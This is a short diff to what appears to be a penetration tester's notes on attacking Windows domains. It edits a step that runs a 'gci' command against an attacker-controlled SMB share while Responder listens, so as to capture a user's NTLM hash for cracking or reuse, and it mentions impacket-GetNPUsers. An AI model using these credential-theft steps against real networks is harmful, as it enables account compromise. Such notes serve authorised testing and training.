@@ -21,9 +21,9 @@ https://github.com/Andre92Marcos/tools/blob/master/netexec/README.md#ldap
 
 ## When we have a domain username, but no password
 
-Do a gci request to get the user hash (and use it in other protocols, and try to crack it)
+Do a gci request to get the user hash (and use it in other protocols, and try to crack it), with responder running
 
-gci \\<mylocalhostip>\share\file #share and file dont have to exist
+   gci \\<mylocalhostip>\share\file #share and file dont have to exist
 
 Run impacket-GetNPUsers
 
